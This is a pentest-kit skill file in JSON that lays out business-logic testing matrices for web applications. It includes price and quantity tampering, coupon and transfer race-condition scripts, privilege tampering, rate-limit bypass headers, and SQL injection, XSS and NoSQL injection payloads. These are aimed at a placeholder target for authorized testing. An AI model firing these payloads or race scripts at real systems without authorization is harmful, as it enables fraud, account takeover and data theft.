  "logic-flaws": {
    "name": "Logic Flaws",
    "category": "logic",
    "tags": [
      "business-logic",
      "workflow",
      "race"
    ],
    "description": "Test for business logic vulnerabilities and workflow bypasses",
    "body": "---\nname: \"logic-flaws\"\ndescription: \"Business logic flaws testing methodology with 12 concrete test matrices\"\nversion: \"2.0.0\"\nauthor: \"pentest-kit\"\ntags: [\"pentest\", \"logic\", \"business-logic\"]\ntrigger_patterns:\n  - \"/logic-flaws\"\n  - \"test business logic\"\n  - \"logic flaw\"\n---\n\n# Business Logic Flaws — Test Matrices\n\nEvery pattern below has: the INVARIANT the developer assumed, concrete\nTESTS to violate it, and the Success/Fail/Filtered outcomes to tell if\nthe test confirmed the flaw.\n\n---\n\n## Pattern 1: Quantity / Price Manipulation\n\n**Invariant**: Quantities are positive; prices come from the server.\n\n| Test | Input | Success | Fail | Filtered |\n|------|-------|---------|------|----------|\n| Negative quantity | `quantity=-1` | Order total decreases | 400 | Silently set to 1 |\n| Zero quantity | `quantity=0` | Free item | 400 | Set to 1 |\n| Overflow | `quantity=99999999999` | Price wraps/crashes | 400 | Capped silently |\n| Client-side price | `price=0.01` in cart POST | Pays $0.01 | Server overrides | Error on checkout |\n| Decimal precision | `price=0.001` | Rounds to 0 | 400 | Rounded up |\n\n```bash\ncurl -X POST https://target/api/cart -d '{\"item\":\"1\",\"qty\":-1,\"price\":0.01}' -H 'Content-Type: application/json'\n```\n\n---\n\n## Pattern 2: Coupon / One-Shot Tokens\n\n**Invariant**: Each coupon code is redeemable once.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Concurrent redeem | 10 parallel POSTs same code | Multiple 200s | Only 1 | All 429 |\n| Retry after claim | Claim, clear cookies, reclaim | 2nd works | 2nd 400 | Same response no discount |\n| Case variation | `CODE` vs `code` | Multiple succeed | Single match | Dedup |\n| Trailing chars | `CODE `, `CODE\\t`, `CODE%00` | Accepted as new | Trimmed | 400 |\n\n```python\nimport asyncio, httpx\nasync def main():\n    async with httpx.AsyncClient() as c:\n        r = await asyncio.gather(*[\n            c.post('https://target/api/coupon/redeem',\n                   json={'code': 'SUMMER20'},\n                   cookies={'session': 'TOKEN'})\n            for _ in range(10)\n        ])\n        print([(x.status_code, x.json().get('discount')) for x in r])\nasyncio.run(main())\n```\n\n---\n\n## Pattern 3: Workflow / Step Skipping\n\n**Invariant**: Checkout has steps cart→shipping→payment→confirm.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Skip payment | POST `/checkout/confirm` without payment | Order placed | 400 | Redirected back |\n| Replay confirm | Replay request after confirm | 2nd order | 409 | Same order |\n| Reset with new ID | Back to cart, change order_id | Two orders | Session invalid | Blocked |\n| Direct state API | `POST /order/status?id=X&status=paid` | State changed | 403 | Server-only |\n\n---\n\n## Pattern 4: Role / Privilege Tampering\n\n**Invariant**: User role is server-enforced, not client-supplied.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Register with role | `POST /register {\"role\":\"admin\"}` | Admin account | 400 | Field ignored |\n| Update own role | `PATCH /users/me {\"role\":\"admin\"}` | Elevated | 403 | Stripped |\n| JWT claim edit | Decode, change role, re-encode | Admin access | 401 sig | Verified |\n| Mass assignment | Extra `isAdmin:true` in body | Set | 400 | Ignored |\n\n---\n\n## Pattern 5: Rate Limit / Throttling Bypass\n\n**Invariant**: N login attempts per minute.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| `X-Forwarded-For` rotate | Different IP per request | All 200 | 429 | Uses real IP |\n| Username rotation | Different email per request | All 200 | 429 | Per-IP |\n| Parallel vs serial | 20 concurrent | Parallel wins | 429 | Queued |\n| Different User-Agent | Rotate UA | Bypass | 429 | Same |\n\n---\n\n## Pattern 6: Second-Order Operations\n\n**Invariant**: Stored data preserves integrity.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Username SQLi | Register `' OR 1=1--` then `/profile` | Other user's data | 400 | Escaped on display |\n| Stored XSS | Register `<script>`, visit pages | Payload fires | Rejected | Encoded on display |\n| Order items tamper | Change items after order | Updated | 403 | Ignored |\n\n---\n\n## Pattern 7: TOCTOU (check-then-act)\n\n**Invariant**: Balance check + deduction are atomic.\n\n```python\nimport asyncio, httpx\nasync def main():\n    async with httpx.AsyncClient() as c:\n        r = await asyncio.gather(*[\n            c.post('https://target/api/transfer',\n                   json={'to': 'attacker', 'amount': 100},\n                   cookies={'session': 'TOKEN'})\n            for _ in range(5)\n        ])\n        print([x.status_code for x in r])\nasyncio.run(main())\n```\n\nSuccess = multiple succeed when only one should.\n\n---\n\n## Pattern 8: Password Reset Logic\n\n**Invariant**: Reset tokens expire, are user-bound, single-use.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Token user-bind | Request reset for A, use token to reset B's password | Changed | 400 mismatch | Bound to A |\n| Predictable tokens | Request 10, analyse format | Sequential/timestamp | UUID4 | |\n| Token in referer | Check URL leaks via Referer to 3rd party | Leaks | No external links | |\n| Race re-request | Request while old still valid | Old works | Invalidated | |\n\n---\n\n## Pattern 9: Email / Identifier Confusion\n\n**Invariant**: One email = one account.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Case variation | `Admin@Target.com` vs lowercase | Two accounts | Case-insensitive | |\n| Unicode homoglyph | `аdmin@target.com` (Cyrillic а) | New account | Normalized | |\n| Leading/trailing space | `admin@target.com ` | New | Trimmed | |\n| Subaddress | `admin+anything@target.com` | Bypasses | Normalized | |\n\n---\n\n## Pattern 10: Sensitive Data Exposure via IDs\n\n**Invariant**: IDs don't leak metadata.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Sequential IDs | `GET /users/1` `/2` `/3` | Enumerate | 403 | UUIDs |\n| ID in URL leaks | Check analytics/Referer | Leaks | GUIDs | |\n| Related IDs | Order ID reveals customer count | Count leak | Random | |\n\n---\n\n## Pattern 11: File / Export Permissions\n\n**Invariant**: Users can only export their own data.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Change `export_user` | `POST /export?user_id=2` | Other user's data | 403 | Filtered to self |\n| URL path param | `/users/2/export` | Works | 403 | |\n| GraphQL alias | `query { me { data } other: user(id:2) { data } }` | Both returned | Aliased out | |\n\n---\n\n## Pattern 12: Integer / Type Confusion\n\n**Invariant**: Type checks match developer intent.\n\n| Test | How | Success | Fail | Filtered |\n|------|-----|---------|------|----------|\n| Array where string | `email=[\"a\",\"b\"]` | Bypass check | 400 | |\n| Null where required | `{\"email\":null}` | Bypass | 400 | |\n| Boolean where int | `{\"quantity\":true}` | Treated as 1 | 400 | |\n| NoSQL operator | `{\"name\":{\"$gt\":\"\"}}` | NoSQL injection | 400 | |\n\n---\n\n## Workflow\n\n1. **Identify invariants**: read the feature, list developer assumptions.\n2. **Pick the pattern** matching the invariant.\n3. **Pick 1-2 tests** from that pattern's matrix.\n4. **Execute** with the commands shown.\n5. **Compare** to Success/Fail/Filtered. Success → finding.\n6. **Document** payload + response excerpt in shared finding schema.\n\nUse category `logic-business` (or more specific: `auth-bypass`, `race`,\n`info-disclosure`)."
  },
